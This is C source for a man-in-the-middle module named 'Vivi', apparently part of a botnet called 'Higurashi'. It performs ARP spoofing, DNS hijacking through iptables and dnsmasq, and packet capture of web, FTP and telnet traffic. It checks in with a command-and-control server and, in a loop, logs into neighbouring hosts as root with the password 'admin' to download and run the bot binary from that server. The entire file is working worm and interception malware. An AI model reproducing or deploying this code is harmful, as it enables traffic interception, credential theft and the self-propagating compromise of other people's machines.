#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <json-c/json.h>
#include "config.h"

// Vivi - MITM Extension for Higurashi
// Performs ARP spoofing and network poisoning

int perform_arp_spoof(const char *target_ip, const char *gateway_ip) {
    // Enable IP forwarding
    int ret = system("echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null");
    (void)ret;
    
    // ARP spoofing using arpspoof (if available)
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "arpspoof -i eth0 -t %s %s >/dev/null 2>&1 &",
        target_ip, gateway_ip);
    ret = system(cmd);
    
    // Fallback to scapy if arpspoof not available
    if (ret != 0) {
        snprintf(cmd, sizeof(cmd),
            "python3 -c 'from scapy.all import *; "
            "def spoof(target, gateway): "
            "  pkt = ARP(op=2, pdst=target, hwdst=\"ff:ff:ff:ff:ff:ff\", psrc=gateway); "
            "  send(pkt, verbose=0); "
            "while True: spoof(\"%s\", \"%s\"); time.sleep(2)' &",
            target_ip, gateway_ip);
        ret = system(cmd);
    }
    
    return 0;
}

void dns_hijack() {
    // Redirect DNS queries using iptables
    int ret = system("iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5353 2>/dev/null");
    (void)ret;
    
    // Start simple DNS forwarder that logs queries
    ret = system("dnsmasq --no-daemon --log-queries --log-facility=/tmp/dns.log &");
    (void)ret;
}

void capture_traffic() {
    // Use tcpdump to capture interesting traffic
    int ret = system("tcpdump -i any -w /tmp/capture.pcap 'port 80 or port 443 or port 21 or port 23' &");
    (void)ret;
}

void scan_and_infect() {
    // Discover new hosts on the network
    FILE *fp = popen("arp -a | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'", "r");
    if (!fp) return;
    
    char ip[32];
    while (fgets(ip, sizeof(ip), fp)) {
        ip[strcspn(ip, "\n")] = '\0';
        
        // Try to infect discovered host
        char cmd[512];
        snprintf(cmd, sizeof(cmd),
            "sshpass -p 'admin' ssh -o StrictHostKeyChecking=no root@%s "
            "'wget http://%s/bots/linux/x86_64/higurashi -O /tmp/h && chmod +x /tmp/h && /tmp/h &' 2>/dev/null &",
            ip, C2_IP);
        int ret = system(cmd);
        (void)ret;
    }
    pclose(fp);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <target_ip>\n", argv[0]);
        return 1;
    }
    
    char *target_ip = argv[1];
    
    // Get gateway
    char gateway[32] = "192.168.1.1"; // Default, should be detected
    FILE *fp = popen("ip route | grep default | awk '{print $3}'", "r");
    if (fp) {
        fgets(gateway, sizeof(gateway), fp);
        gateway[strcspn(gateway, "\n")] = '\0';
        pclose(fp);
    }
    
    // Connect to C2
    SSL_library_init();
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &addr.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
        SSL *ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);
        
        if (SSL_connect(ssl) > 0) {
            // Send handshake
            char id_buf[128];
            snprintf(id_buf, sizeof(id_buf), "vivi_%s_%d", target_ip, getpid());
            
            json_object *handshake = json_object_new_object();
            json_object_object_add(handshake, "action", json_object_new_string("handshake"));
            json_object_object_add(handshake, "type", json_object_new_string("vivi"));
            json_object_object_add(handshake, "id", json_object_new_string(id_buf));
            json_object_object_add(handshake, "target", json_object_new_string(target_ip));
            
            const char *json_str = json_object_to_json_string(handshake);
            SSL_write(ssl, json_str, strlen(json_str));
            json_object_put(handshake);
            
            // Report start
            json_object *report = json_object_new_object();
            json_object_object_add(report, "action", json_object_new_string("report"));
            json_object_object_add(report, "type", json_object_new_string("mitm_start"));
            json_object_object_add(report, "data", json_object_new_string(target_ip));
            
            json_str = json_object_to_json_string(report);
            SSL_write(ssl, json_str, strlen(json_str));
            json_object_put(report);
        }
        SSL_free(ssl);
    }
    close(sock);
    
    // Perform MITM attack
    printf("[Vivi] Starting MITM on %s via gateway %s\n", target_ip, gateway);
    
    perform_arp_spoof(target_ip, gateway);
    dns_hijack();
    capture_traffic();
    
    // Continuously scan and infect
    while (1) {
        scan_and_infect();
        sleep(60);
    }
    
    return 0;
}